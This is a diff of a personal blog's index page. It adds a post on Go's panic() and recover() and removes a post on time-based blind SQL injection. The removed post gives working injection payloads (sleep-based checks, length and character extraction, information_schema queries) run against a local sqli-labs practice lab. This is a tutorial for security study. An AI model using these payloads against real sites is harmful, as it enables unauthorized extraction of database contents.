@@ -158,6 +158,91 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/12/30/goPanicAndRecover/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/12/30/goPanicAndRecover/" class="post-title-link" itemprop="url">panic() and recover() in the Go Language</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-12-30 20:48:46" itemprop="dateCreated datePublished" datetime="2018-12-30T20:48:46-05:00">2018-12-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-17 11:39:09" itemprop="dateModified" datetime="2023-10-17T11:39:09-04:00">2023-10-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/panic-and-recover/" itemprop="url" rel="index"><span itemprop="name">panic() and recover()</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong><em>panic()</em></strong> and <strong><em>recover()</em></strong> are two important functions in the Go language for handling exceptions. Here is a simple example that demonstrates how to use <strong><em>panic()</em></strong> and <strong><em>recover()</em></strong> in Go.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// A function to simulate a situation that might cause a panic</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doSomething</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;Panic occurred but recovered:&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Simulate a problematic situation</span></span><br><span class="line">    num1 := <span class="number">10</span></span><br><span class="line">    num2 := <span class="number">0</span></span><br><span class="line">    result := num1 / num2 <span class="comment">// This will cause a division by zero panic</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Result is:&quot;</span>, result) <span class="comment">// This won&#x27;t be printed as the panic has already occurred</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Starting the program&quot;</span>)</span><br><span class="line"></span><br><span class="line">    doSomething()</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Program continues to execute&quot;</span>) <span class="comment">// Even if a panic occurs, this line will be printed because the panic has been recovered in doSomething()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>In the example above, the doSomething() function attempts to divide 10 by 0, which would lead to a division by zero panic. However, we use <strong><em>defer()</em></strong> and <strong><em>recover()</em></strong> to catch and handle the panic. In the main() function, even if a panic occurs within doSomething(), the program continues to execute, and the panic information is printed within the <strong><em>recover()</em></strong> block.</p>
+<p>Running this program will produce the following output:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Starting the program</span><br><span class="line">Panic occurred but recovered: runtime error: <span class="built_in">integer</span> divide by zero</span><br><span class="line">Program continues to execute</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>This demonstrates that the <strong><em>recover()</em></strong> function successfully catches the panic, allowing the program to continue executing without terminating.”</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2018/12/16/goDefer/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1059,102 +1144,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/10/28/SQLInjectionTimeBasedBlind/" class="post-title-link" itemprop="url">Time-Based Blind SQL Injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-10-28 22:31:42" itemprop="dateCreated datePublished" datetime="2016-10-28T22:31:42-04:00">2016-10-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 20:37:49" itemprop="dateModified" datetime="2023-10-18T20:37:49-04:00">2023-10-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Time-Based Blind SQL Injection</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Time-Based-Blind-SQL-Injection-Steps"><a href="#Time-Based-Blind-SQL-Injection-Steps" class="headerlink" title="Time-Based Blind SQL Injection Steps:"></a>Time-Based Blind SQL Injection Steps:</h1><ol>
-<li>First, check if an injection vulnerability exists.</li>
-<li>Next, determine the injection type: character-based, numeric-based, or search-based.</li>
-<li>Determine the available injection method; in this case, union injection and Boolean-based blind injection are not available:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and 1=2 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and sleep(5) %23  </span><br></pre></td></tr></table></figure>
- Page experiences a 5-second delay, indicating the sleep function is injected into the database, confirming the presence of time-based blind injection.</li>
-<li>Start by obtaining the length of the database name:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 (5-second delay)</span><br><span class="line">?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 (No 5-second delay)</span><br></pre></td></tr></table></figure>
-This indicates that the database name has a length of 8 characters.</li>
-<li>Proceed to retrieve the database name character by character:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;n),sleep(5),1) %23</span><br></pre></td></tr></table></figure>
-These steps describe a method for performing time-based blind SQL injection to extract information about the database, such as the length of the database name and the characters that make up the name.</li>
-</ol>
-<h1 id="Example-of-Time-Based-Blind-SQL-Injection-Operation"><a href="#Example-of-Time-Based-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Time-Based Blind SQL Injection Operation:"></a>Example of Time-Based Blind SQL Injection Operation:</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1\ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and 1=1 --+ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5) %23 5秒钟后响应,说明是字符型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and sleep(5) %23  响应的比较快,说明不是数字型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 不延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;114),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;115),sleep(5),1) %23 不延时5秒,得出结论,第一个字符是s,以此类推</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(5),1) --+ 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;4,sleep(5),1) --+ 不延时5秒</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1226,19 +1215,19 @@ These steps describe a method for performing time-based blind SQL injection to e
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-count">66</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
